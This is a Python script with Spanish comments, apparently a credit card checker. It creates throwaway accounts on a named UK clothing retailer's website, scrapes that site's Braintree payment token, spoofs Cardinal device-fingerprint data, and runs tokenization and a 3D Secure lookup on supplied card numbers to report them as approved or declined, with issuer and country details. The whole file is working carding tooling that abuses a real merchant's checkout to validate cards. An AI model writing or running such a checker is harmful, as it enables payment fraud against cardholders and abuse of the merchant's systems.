import re
import requests
import random
import json
import string
import base64
import jwt

def extract_from_text(text, start, end):
    """Extrae texto entre dos marcadores"""
    try:
        start_index = text.index(start) + len(start)
        end_index = text.index(end, start_index)
        return text[start_index:end_index]
    except ValueError:
        return None

def generate_random_email():
    """Genera un email aleatorio único"""
    name = ''.join(random.choices(string.ascii_lowercase, k=10))
    number = ''.join(random.choices(string.digits, k=4))
    return f"{name}{number}@gmail.com"

def verify_braintree_card(card_number, exp_month, exp_year, cvv, user_agent=None):
    """
    Verifica una tarjeta usando Braintree 3D Secure
    
    Args:
        card_number: Número de tarjeta (sin espacios)
        exp_month: Mes de expiración (MM)
        exp_year: Año de expiración (YY)
        cvv: Código CVV
        user_agent: User-Agent opcional (se genera uno si no se proporciona)
    
    Returns:
        dict con:
            - success: bool
            - status: str ('approved', 'declined', 'error')
            - message: str
            - details: dict con información adicional
    """
    try:
        # Generar user-agent si no se proporciona
        if not user_agent:
            try:
                import user_agent as ua_module
                user_agent = ua_module.generate_user_agent()
            except:
                user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        
        # Inicializar sesión
        r = requests.session()
        email = generate_random_email()
        
        # Extraer BIN (primeros 6 dígitos)
        bin3 = card_number[:6] if len(card_number) >= 6 else ''
        
        # Formatear mes
        if len(exp_month) == 1:
            exp_month = f'0{exp_month}'
        
        # Formatear año (asegurar 2 dígitos)
        if len(exp_year) == 4:
            exp_year = exp_year[2:]
        
        # Paso 1: Registrar cuenta en redoakwear.co.uk
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.redoakwear.co.uk',
            'referer': 'https://www.redoakwear.co.uk/',
            'user-agent': user_agent,
        }
        
        form_data = {
            'ctl00$ctl00$txtSearch': '',
            'ctl00$ctl00$ContentMain$ContentPlaceHolder1$emailbox': '',
            'ctl00$ctl00$ContentMain$ContentPlaceHolder1$passwordbox': '',
            'ctl00$ctl00$ContentMain$ContentPlaceHolder1$txtForgotEmail': email,
            'ctl00$ctl00$ContentMain$ContentPlaceHolder1$txtFirstName': 'normal',
            'ctl00$ctl00$ContentMain$ContentPlaceHolder1$txtLastName': 'youtube',
            'ctl00$ctl00$ContentMain$ContentPlaceHolder1$txtAge': '11/11/1985',
            'ctl00$ctl00$ContentMain$ContentPlaceHolder1$mobile': '64646246346',
            'ctl00$ctl00$ContentMain$ContentPlaceHolder1$sex': 'chkmale',
            'ctl00$ctl00$ContentMain$ContentPlaceHolder1$txtEmail': email,
            'ctl00$ctl00$ContentMain$ContentPlaceHolder1$TtxtConfirmEmail': email,
            'ctl00$ctl00$ContentMain$ContentPlaceHolder1$txtPass': '01129409099',
            'ctl00$ctl00$ContentMain$ContentPlaceHolder1$txtConfirmPass': '01129409099',
            'ctl00$ctl00$ContentMain$ContentPlaceHolder1$btnAdd': 'Register Now',
            'ctl00$ctl00$txtEmail': '',
            'ctl00$ctl00$formdata': '',
            'ctl00$ctl00$formid': '',
            'ctl00$ctl00$formref': '',
            'ctl00$ctl00$lstCountry': '243',
        }
        
        r.post('https://www.redoakwear.co.uk/login/', headers=headers, data=form_data, timeout=30)
        
        # Paso 2: Añadir producto al carrito
        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://www.redoakwear.co.uk',
            'referer': 'https://www.redoakwear.co.uk/',
            'user-agent': user_agent,
            'x-requested-with': 'XMLHttpRequest',
        }
        
        r.post(
            'https://www.redoakwear.co.uk/webservice/frontend.asmx/addtobasket',
            headers=headers,
            json={'pid': 28934, 'varid': '3768', 'qty': '1', 'additional': []},
            timeout=30
        )
        
        # Paso 3: Obtener checkout y token de autorización
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'user-agent': user_agent,
        }
        
        checkout_response = r.get('https://www.redoakwear.co.uk/checkout/', headers=headers, timeout=30)
        token_match = re.search(r"authorization:\s*'([^']+)'", checkout_response.text)
        
        if not token_match:
            return {
                'success': False,
                'status': 'error',
                'message': 'Error al obtener token de autorización',
                'details': {}
            }
        
        token = token_match.group(1)
        decoded_token = base64.b64decode(token).decode('utf-8')
        auth_data = json.loads(decoded_token)
        auth_fingerprint = auth_data.get('authorizationFingerprint')
        
        if not auth_fingerprint:
            return {
                'success': False,
                'status': 'error',
                'message': 'Error al obtener fingerprint de autorización',
                'details': {}
            }
        
        # Paso 4: Obtener configuración del cliente y Cardinal JWT
        headers = {
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'authorization': f'Bearer {auth_fingerprint}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://www.redoakwear.co.uk',
            'priority': 'u=1, i',
            'referer': 'https://www.redoakwear.co.uk/',
            'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': user_agent,
        }
        
        graphql_response = r.post(
            'https://payments.braintree-api.com/graphql',
            headers=headers,
            json={
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': '306227d6-7f79-4328-b40e-975875946f47',
                },
                'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       privacyUrl       userAgreementUrl       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment     }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
                'operationName': 'ClientConfiguration',
            },
            timeout=30
        )
        
        cardinal_jwt = extract_from_text(graphql_response.text, '"cardinalAuthenticationJWT":"', '"')
        
        if not cardinal_jwt:
            return {
                'success': False,
                'status': 'error',
                'message': 'Error al obtener JWT de Cardinal',
                'details': {}
            }
        
        # Paso 5: Inicializar Cardinal
        reference_id = None
        try:
            cardinal_init_response = r.post(
                'https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init',
                headers={
                    'accept': '*/*',
                    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
                    'content-type': 'application/json;charset=UTF-8',
                    'origin': 'https://www.redoakwear.co.uk',
                    'priority': 'u=1, i',
                    'referer': 'https://www.redoakwear.co.uk/',
                    'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site',
                    'user-agent': user_agent,
                },
                json={
                    'BrowserPayload': {
                        'Order': {
                            'OrderDetails': {},
                            'Consumer': {
                                'BillingAddress': {},
                                'ShippingAddress': {},
                                'Account': {},
                            },
                            'Cart': [],
                            'Token': {},
                            'Authorization': {},
                            'Options': {},
                            'CCAExtension': {},
                        },
                        'SupportsAlternativePayments': {
                            'cca': True,
                            'hostedFields': False,
                            'applepay': False,
                            'discoverwallet': False,
                            'wallet': False,
                            'paypal': False,
                            'visacheckout': False,
                        },
                    },
                    'Client': {
                        'Agent': 'SongbirdJS',
                        'Version': '1.35.0',
                    },
                    'ConsumerSessionId': '0_c9cde407-32ef-470c-83fc-5e406cbcc6d6',
                    'ServerJWT': cardinal_jwt,
                },
                timeout=30
            )
            
            cardinal_response_data = cardinal_init_response.json()
            cardinal_payload = cardinal_response_data.get('CardinalJWT', '')
            
            if cardinal_payload:
                payload_dict = jwt.decode(cardinal_payload, options={"verify_signature": False})
                reference_id = payload_dict.get('ReferenceId')
        except Exception as e:
            # Continuar sin reference_id si falla Cardinal
            pass
        
        # Paso 5.5: Device Fingerprint (SaveBrowserData)
        if reference_id:
            try:
                cookies = {
                    '__cfruid': 'c4430e4d223a2f4f35398d0b6093f99f2989f5a7-1760829286',
                }
                
                headers = {
                    'accept': '*/*',
                    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
                    'content-type': 'application/json',
                    'origin': 'https://geo.cardinalcommerce.com',
                    'priority': 'u=1, i',
                    'referer': f'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=true&alias=Default&orgUnitId=5c8a9f5c791eef31e8318cab&tmEventType=PAYMENT&referenceId={reference_id}&geolocation=false&origin=Songbird',
                    'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-storage-access': 'active',
                    'user-agent': user_agent,
                    'x-requested-with': 'XMLHttpRequest',
                }
                
                json_data = {
                    'Cookies': {
                        'Legacy': True,
                        'LocalStorage': True,
                        'SessionStorage': True,
                    },
                    'DeviceChannel': 'Browser',
                    'Extended': {
                        'Browser': {
                            'Adblock': True,
                            'AvailableJsFonts': [],
                            'DoNotTrack': 'unknown',
                            'JavaEnabled': False,
                        },
                        'Device': {
                            'ColorDepth': 24,
                            'Cpu': 'unknown',
                            'Platform': 'Win32',
                            'TouchSupport': {
                                'MaxTouchPoints': 0,
                                'OnTouchStartAvailable': False,
                                'TouchEventCreationSuccessful': False,
                            },
                        },
                    },
                    'Fingerprint': '61dee4f21e8be9bb6c582aba61e38776',
                    'FingerprintingTime': 1189,
                    'FingerprintDetails': {
                        'Version': '1.5.1',
                    },
                    'Language': 'ar-EG',
                    'Latitude': None,
                    'Longitude': None,
                    'OrgUnitId': '5c8a9f5c791eef31e8318cab',
                    'Origin': 'Songbird',
                    'Plugins': [
                        'PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
                        'Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
                        'Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
                        'Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
                        'WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
                    ],
                    'ReferenceId': reference_id,
                    'Referrer': 'https://www.redoakwear.co.uk/',
                    'Screen': {
                        'FakedResolution': False,
                        'Ratio': 1.7777777777777777,
                        'Resolution': '1920x1080',
                        'UsableResolution': '1920x1040',
                        'CCAScreenSize': '01',
                    },
                    'CallSignEnabled': None,
                    'ThreatMetrixEnabled': False,
                    'ThreatMetrixEventType': 'PAYMENT',
                    'ThreatMetrixAlias': 'Default',
                    'TimeOffset': -180,
                    'UserAgent': user_agent,
                    'UserAgentDetails': {
                        'FakedOS': False,
                        'FakedBrowser': False,
                    },
                    'BinSessionId': '019cee1d-c6e2-4a59-b83c-ead7036d98cd',
                }
                
                r.post(
                    'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData',
                    cookies=cookies,
                    headers=headers,
                    json=json_data,
                    timeout=30
                )
            except Exception as e:
                # Continuar si falla el fingerprint
                pass
        
        # Paso 6: Tokenizar tarjeta
        headers = {
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'authorization': f'Bearer {auth_fingerprint}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'priority': 'u=1, i',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': user_agent,
        }
        
        tokenize_response = r.post(
            'https://payments.braintree-api.com/graphql',
            headers=headers,
            json={
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': '306227d6-7f79-4328-b40e-975875946f47',
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': card_number,
                            'expirationMonth': exp_month,
                            'expirationYear': exp_year,
                            'cvv': cvv,
                        },
                        'options': {
                            'validate': False,
                        },
                    },
                },
                'operationName': 'TokenizeCreditCard',
            },
            timeout=30
        )
        
        tokenize_data = tokenize_response.json()
        
        if 'data' not in tokenize_data or 'tokenizeCreditCard' not in tokenize_data['data']:
            return {
                'success': False,
                'status': 'declined',
                'message': 'Tarjeta rechazada - Tokenización fallida',
                'details': {}
            }
        
        card_token = tokenize_data['data']['tokenizeCreditCard']['token']
        card_info = tokenize_data['data']['tokenizeCreditCard']['creditCard']
        # Usar el bin de la respuesta o el bin extraído del número de tarjeta
        bin_number = card_info.get('bin', bin3) if bin3 else card_info.get('bin', '553295')
        
        # Extraer información del binData si está disponible
        bin_data = card_info.get('binData', {})
        country_of_issuance = bin_data.get('countryOfIssuance', '')
        
        # Paso 7: Verificar con 3D Secure
        headers = {
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/json',
            'origin': 'https://www.redoakwear.co.uk',
            'priority': 'u=1, i',
            'referer': 'https://www.redoakwear.co.uk/',
            'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': user_agent,
        }
        
        three_ds_response = r.post(
            f'https://api.braintreegateway.com/merchants/prxwc3bh42938nmk/client_api/v1/payment_methods/{card_token}/three_d_secure/lookup',
            headers=headers,
            json={
                'amount': '3.76',
                'additionalInfo': {
                    'billingLine1': 'Hsjnjjh',
                    'billingLine2': 'Dbjjbhbx',
                    'billingCity': 'Mankind',
                    'billingPostalCode': 'AB38 7AY',
                    'billingCountryCode': 'GB',
                    'billingPhoneNumber': '436433',
                    'billingGivenName': 'j',
                    'billingSurname': 'd',
                    'email': email,
                },
                'bin': bin3 if bin3 else (bin_number if bin_number else '553295'),
                'dfReferenceId': reference_id or '',
                'clientMetadata': {
                    'requestedThreeDSecureVersion': '2',
                    'sdkVersion': 'web/3.85.2',
                    'cardinalDeviceDataCollectionTimeElapsed': 3,
                    'issuerDeviceDataCollectionTimeElapsed': 10925,
                    'issuerDeviceDataCollectionResult': False,
                },
                'authorizationFingerprint': auth_fingerprint,
                'braintreeLibraryVersion': 'braintree/web/3.85.2',
                '_meta': {
                    'merchantAppId': 'www.redoakwear.co.uk',
                    'platform': 'web',
                    'sdkVersion': '3.85.2',
                    'source': 'client',
                    'integration': 'custom',
                    'integrationType': 'custom',
                    'sessionId': 'fae9f597-2233-4f03-b7c6-d236c46a2857',
                },
            },
            timeout=30
        )
        
        # Procesar respuesta
        try:
            response_json = three_ds_response.json()
        except:
            return {
                'success': False,
                'status': 'error',
                'message': 'Error al procesar respuesta de Braintree',
                'details': {'http_status': three_ds_response.status_code}
            }
        
        # Verificar errores en la respuesta
        if 'errors' in response_json:
            error_msg = response_json.get('message', 'Error desconocido')
            if 'errors' in response_json and isinstance(response_json['errors'], list) and len(response_json['errors']) > 0:
                error_msg = response_json['errors'][0].get('message', error_msg)
            return {
                'success': False,
                'status': 'declined',
                'message': f'Error: {error_msg}',
                'details': {'error_code': response_json.get('errors', [{}])[0].get('code', 'unknown') if response_json.get('errors') else 'unknown'}
            }
        
        payment_method = response_json.get('paymentMethod', {})
        three_ds_info = payment_method.get('threeDSecureInfo', {})
        status_raw = three_ds_info.get('status', 'Unknown')
        
        # Normalizar status
        status_normalized = status_raw.replace('_', ' ').title()
        issuing_bank = extract_from_text(three_ds_response.text, '"issuingBank":"', '","')
        card_type_raw = extract_from_text(three_ds_response.text, '"cardType":"', '","')
        
        # Determinar el tipo de tarjeta (CREDIT/DEBIT) desde binData si está disponible
        card_type = 'CREDIT'  # Por defecto
        bin_data_full = card_info.get('binData', {})
        if bin_data_full:
            # Preferir el tipo desde binData
            if bin_data_full.get('debit'):
                card_type = 'DEBIT'
            elif bin_data_full.get('prepaid'):
                card_type = 'PREPAID'
            else:
                card_type = 'CREDIT'
        
        # Intentar extraer país de la respuesta 3D Secure si no se obtuvo antes
        if not country_of_issuance:
            country_of_issuance = extract_from_text(three_ds_response.text, '"countryOfIssuance":"', '","')
            if not country_of_issuance:
                # Intentar desde el binData en la respuesta
                payment_bin_data = payment_method.get('binData', {})
                if payment_bin_data:
                    country_of_issuance = payment_bin_data.get('countryOfIssuance', '')
                # También intentar desde el binData del payment method directamente
                if not country_of_issuance and 'binData' in payment_method:
                    bin_data_response = payment_method.get('binData', {})
                    if isinstance(bin_data_response, dict):
                        country_of_issuance = bin_data_response.get('countryOfIssuance', '')
        
        # Normalizar el código de país a 2 letras mayúsculas
        if country_of_issuance:
            country_of_issuance = str(country_of_issuance).strip().upper()
            # Si tiene más de 2 caracteres, tomar solo los primeros 2
            if len(country_of_issuance) > 2:
                country_of_issuance = country_of_issuance[:2]
        
        # Obtener información completa del BIN usando binlist.net (igual que Stripe)
        bin_info = None
        if bin_number and len(str(bin_number)) >= 6:
            try:
                bin_lookup = str(bin_number)[:6]
                bin_response = requests.get(
                    f"https://lookup.binlist.net/{bin_lookup}",
                    headers={'Accept-Version': '3'},
                    timeout=5
                )
                if bin_response.status_code == 200:
                    bin_info = bin_response.json()
                    # Si binlist tiene país, usarlo (es más confiable)
                    if bin_info.get('country') and bin_info['country'].get('alpha2'):
                        country_of_issuance = bin_info['country']['alpha2'].upper()
            except Exception:
                bin_info = None
        
        # Si no hay bin_info pero tenemos código de país, crear estructura básica
        if not bin_info and country_of_issuance:
            bin_info = {
                'country': {
                    'alpha2': country_of_issuance,
                    'name': None
                }
            }
        
        # Determinar resultado
        if 'Successful' in status_normalized or 'Challenge Required' in status_normalized:
            return {
                'success': True,
                'status': 'approved',
                'message': f'Tarjeta válida - {status_normalized}',
                'details': {
                    'status': status_normalized,
                    'card': {
                        'last4': card_info.get('last4', ''),
                        'brand': card_info.get('brandCode', '').upper(),
                        'bin': bin_number,
                        'type': card_type or 'CREDIT',
                        'issuing_bank': issuing_bank or 'N/A',
                        'country': country_of_issuance or 'N/A',
                    },
                    'bin_info': bin_info,
                    'three_d_secure': status_normalized
                }
            }
        else:
            return {
                'success': False,
                'status': 'declined',
                'message': f'Tarjeta rechazada - {status_normalized}',
                'details': {
                    'status': status_normalized,
                    'card': {
                        'last4': card_info.get('last4', ''),
                        'brand': card_info.get('brandCode', '').upper(),
                    }
                }
            }
    
    except Exception as e:
        return {
            'success': False,
            'status': 'error',
            'message': f'Error inesperado: {str(e)}',
            'details': {}
        }
